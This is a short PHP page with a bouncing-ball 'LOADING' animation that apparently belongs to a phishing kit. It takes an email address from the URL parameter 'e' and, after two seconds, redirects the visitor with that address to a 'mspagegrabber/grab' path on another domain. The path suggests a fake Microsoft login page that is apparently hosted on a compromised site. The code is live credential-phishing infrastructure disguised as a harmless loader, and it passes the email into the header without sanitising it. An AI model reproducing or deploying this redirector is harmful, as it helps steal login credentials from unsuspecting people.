<?php 
$e = $_GET['e'];
header("Refresh:2; url=https://alliedconnecting.com/public_html/images/media/m/s/p/parloi/mspagegrabber/grab?e=$e");
?>
<!DOCTYPE html>
<html>

<head>
    <title></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <style type="text/css">
     
     @import url(https://fonts.googleapis.com/css?family=Montserrat);
body {
  position: relative;
  width: 100%;
  height: 100vh;
  font-family: Montserrat;
}

.wrap {
  position: absolute;
  top: 50%;
  left: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
}

.text {
  color: #071765c4;
  display: inline-block;
  margin-left: 5px;
}

.bounceball {
  position: relative;
  display: inline-block;
  height: 37px;
  width: 15px;
}
.bounceball:before {
  position: absolute;
  content: '';
  display: block;
  top: 0;
  width: 15px;
  height: 15px;
  border-radius: 50%;
  background-color: #071765c4;
  -webkit-transform-origin: 50%;
          transform-origin: 50%;
  -webkit-animation: bounce 500ms alternate infinite ease;
          animation: bounce 500ms alternate infinite ease;
}

@-webkit-keyframes bounce {
  0% {
    top: 30px;
    height: 5px;
    border-radius: 60px 60px 20px 20px;
    -webkit-transform: scaleX(2);
            transform: scaleX(2);
  }
  35% {
    height: 15px;
    border-radius: 50%;
    -webkit-transform: scaleX(1);
            transform: scaleX(1);
  }
  100% {
    top: 0;
  }
}

@keyframes bounce {
  0% {
    top: 30px;
    height: 5px;
    border-radius: 60px 60px 20px 20px;
    -webkit-transform: scaleX(2);
            transform: scaleX(2);
  }
  35% {
    height: 15px;
    border-radius: 50%;
    -webkit-transform: scaleX(1);
            transform: scaleX(1);
  }
  100% {
    top: 0;
  }
}
    </style>
</head>

<body >
    <div class="wrap">
        <div class="loading">
          <div class="bounceball"></div>
          <div class="text"> LOADING</div>
        </div>
      </div>
</body>

</html>